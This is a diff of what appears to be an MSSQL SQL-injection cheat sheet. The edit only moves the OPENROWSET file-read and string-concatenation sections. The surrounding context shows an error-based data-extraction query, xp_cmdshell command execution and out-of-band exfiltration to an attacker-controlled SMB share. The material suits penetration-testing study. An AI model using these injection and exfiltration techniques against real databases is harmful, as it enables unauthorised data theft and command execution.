@@ -144,6 +144,8 @@ SELECT CONVERT(INT, (SELECT City FROM ORGDB.dbo.Employees ORDER BY City OFFSET 0
 ```
 Try to change 0 to 100 because that is indexing and here you can see one record at a time.
 
+---
+
 ### Command execution via xp_cmdshell (requires sysadmin privileges)
 `xp_cmdshell` is disabled by default and must be explicitly enabled by a privileged account:
 ```sql
@@ -229,6 +231,20 @@ MSSQL supports statement chaining with `;`, which is significant for injection t
 /* */ (multi-line)
 ```
 
+### OPENROWSET (if enabled)
+Can be used to read files or make outbound connections — worth exploring in a lab environment:
+```sql
+SELECT * FROM OPENROWSET(BULK 'C:\path\to\file.txt', SINGLE_CLOB) AS Contents;
+```
+
+### String concatenation
+MSSQL uses `+` for string concatenation (not `CONCAT()` in all contexts, and not `||` like Oracle/PostgreSQL):
+```sql
+SELECT 'a' + 'b';
+```
+
+---
+
 ### Out-of-band (OOB) exfiltration
 When there's no direct output channel, force the server to reach out to an SMB share you control:
 ```sql
@@ -281,19 +297,6 @@ EXEC sp_OAMethod @obj, 'send';
 - Bypasses response suppression entirely — no need for any visible output
 - Faster and more reliable than time-based blind for large data extraction
 - DNS variant works even in networks with strict outbound rules (SMB/HTTP blocked but DNS allowed for resolution)
-
-
-### OPENROWSET (if enabled)
-Can be used to read files or make outbound connections — worth exploring in a lab environment:
-```sql
-SELECT * FROM OPENROWSET(BULK 'C:\path\to\file.txt', SINGLE_CLOB) AS Contents;
-```
-
-### String concatenation
-MSSQL uses `+` for string concatenation (not `CONCAT()` in all contexts, and not `||` like Oracle/PostgreSQL):
-```sql
-SELECT 'a' + 'b';
-```
 
 ---
 
